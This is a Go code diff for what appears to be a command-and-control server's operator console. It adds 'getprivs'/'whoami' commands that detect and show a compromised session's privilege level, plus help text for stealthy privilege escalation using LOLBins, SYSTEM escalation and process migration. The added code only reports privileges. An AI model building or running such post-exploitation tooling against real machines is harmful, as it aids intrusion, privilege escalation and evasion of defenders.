@@ -2229,6 +2229,10 @@ func (is *InteractiveServer) sessionShell(sessionID string) error {
 			if err := is.executeGetSystemSafe(sessionID); err != nil {
 				fmt.Printf("[!] Error: %v\n", err)
 			}
+		case "getprivs", "whoami":
+			if err := is.executeGetPrivs(sessionID); err != nil {
+				fmt.Printf("[!] Error: %v\n", err)
+			}
 		case "kill", "k":
 			if err := is.executeKill(sessionID); err != nil {
 				fmt.Printf("[!] Error: %v\n", err)
@@ -2244,6 +2248,8 @@ func (is *InteractiveServer) sessionShell(sessionID string) error {
 			fmt.Println("  modules          - List available modules")
 			fmt.Println("  queue            - List pending tasks")
 			fmt.Println("  getsystem        - Elevate to SYSTEM privileges (Windows)")
+			fmt.Println("  getsystemsafe    - Stealthy privilege escalation using LOLBins only")
+			fmt.Println("  getprivs, whoami - Show current privilege level and username")
 			fmt.Println("  migrate <pid>   - Migrate to another process")
 			fmt.Println("  grep <pattern> <path> - Search file contents")
 			fmt.Println("  head <path>      - Show first lines of file")
@@ -3002,6 +3008,85 @@ func (is *InteractiveServer) detectPrivilegeLevelLOLBin(sessionID string) (core.
 	}
 
 	return privLevelEnum, username, nil
+}
+
+// executeGetPrivs displays the current privilege level and username of the session
+func (is *InteractiveServer) executeGetPrivs(sessionID string) error {
+	if is.server == nil {
+		return fmt.Errorf("server not initialized\n" +
+			"  Ensure the C2 server is running with 'server start'")
+	}
+
+	// Validate session exists
+	session, ok := is.sessionMgr.GetSession(sessionID)
+	if !ok {
+		return fmt.Errorf("session not found: %s\n"+
+			"  Session may have disconnected. Use 'sessions' to list active sessions", shortID(sessionID))
+	}
+
+	// Get current privilege level from session (if already detected)
+	currentPriv := session.GetPrivilegeLevel()
+	username := session.GetUsername()
+
+	// If not already detected, detect it now
+	if currentPriv == core.PrivilegeUnknown || username == "" {
+		fmt.Printf("[*] Detecting privilege level...\n")
+		var err error
+		currentPriv, username, err = is.detectPrivilegeLevelLOLBin(sessionID)
+		if err != nil {
+			// Fallback to PowerShell-based detection
+			currentPriv, username, err = is.detectPrivilegeLevel(sessionID)
+			if err != nil {
+				return fmt.Errorf("failed to detect privilege level: %v", err)
+			}
+		}
+		
+		// Update session with detected info
+		session.SetPrivilegeLevel(currentPriv)
+		session.SetUsername(username)
+		session.SetMetadata("privilege_level", string(currentPriv))
+		session.SetMetadata("username", username)
+	}
+
+	// Display privilege information with color coding
+	fmt.Println("\n" + strings.Repeat("=", 60))
+	fmt.Println("PRIVILEGE INFORMATION")
+	fmt.Println(strings.Repeat("=", 60))
+	
+	// Color code based on privilege level
+	var privColor, resetColor string
+	switch currentPriv {
+	case core.PrivilegeSystem:
+		privColor = "\033[35m" // Magenta
+	case core.PrivilegeAdmin:
+		privColor = "\033[33m" // Yellow
+	case core.PrivilegeUser:
+		privColor = "\033[36m" // Cyan
+	default:
+		privColor = "\033[90m" // Gray
+	}
+	resetColor = "\033[0m"
+	
+	fmt.Printf("Username:  %s\n", username)
+	fmt.Printf("Privilege: %s%s%s\n", privColor, strings.ToUpper(string(currentPriv)), resetColor)
+	
+	// Add helpful context
+	switch currentPriv {
+	case core.PrivilegeSystem:
+		fmt.Println("\n[+] You have SYSTEM privileges - highest level access")
+	case core.PrivilegeAdmin:
+		fmt.Println("\n[*] You have Administrator privileges")
+		fmt.Println("[*] Use 'getsystem' or 'getsystemsafe' to escalate to SYSTEM")
+	case core.PrivilegeUser:
+		fmt.Println("\n[*] You have User privileges")
+		fmt.Println("[*] Use 'getsystem' or 'getsystemsafe' to escalate to Admin/System")
+	default:
+		fmt.Println("\n[!] Privilege level could not be determined")
+	}
+	
+	fmt.Println(strings.Repeat("=", 60) + "\n")
+	
+	return nil
 }
 
 // getCallbackURL extracts callback URL from session
